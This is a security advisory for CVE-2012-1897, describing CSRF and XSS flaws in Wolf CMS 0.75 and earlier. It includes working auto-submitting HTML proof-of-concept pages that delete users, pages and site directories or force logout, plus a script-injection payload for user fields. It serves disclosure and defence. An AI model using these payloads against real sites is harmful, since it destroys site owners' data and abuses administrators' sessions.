CVE-2012-1897

1. Description

Multiple cross-site request forgery (CSRF) vulnerabilities in Wolf CMS 0.75 and earlier allow remote attackers to hijack the authentication of administrators for requests that (1) delete users via the user id number to admin/user/delete; (2) delete pages via the page id number to admin/page/delete; delete the (3) images or (4) themes directory via the directory name to admin/plugin/file_manager/delete, and possibly other directories; or (5) logout the user via a request to admin/login/logout.

2. Vulnerabilities Description

Wolfcms 0.75 (and lower) is prone to multiple CSRF vulnerabilities that allow to delete admin/user, delete web pages, delete 
"images" and "themes" directory, force logout  when an authenticated admin/user browses a special crafted web page.
This cms is also affected by XSS vulnerabilities in "wolfcms/admin/user/add" pages due to an improper input sanitization of 
"user[name]", "user[email]" and "user[username]" parameters passed via POST http method.

3. Exploit
 3.1 CSRF (Delete Admin/User)
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/user/delete/2">
 </form>
 </body>
 </html>

 3.2 CSRF (Delete Pages)
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/page/delete/1">
 </form>
 </body>
 </html> 
 
 3.3 CSRF - Delete "images" directory
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/plugin/file_manager/delete/images">
 </form>
 </body>
 </html> 

 3.4 CSRF - Delete "themes" directory
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/plugin/file_manager/delete/themes">
 </form>
 </body>
 </html>
 

 3.5 CSRF (Force Logout)
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/login/logout">
 </form>
 </body>
 </html>


 3.6 XSS
 To exploit "Name" and "Username" "E-mail" fields: 
 "><script>alert("XSS")</script> 

SOURCES

- http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1897
- https://packetstormsecurity.com/files/111116/Wolfcms-0.75-Cross-Site-Request-Forgery-Cross-Site-Scripting.html
- https://www.us-cert.gov/ncas/bulletins/SB12-282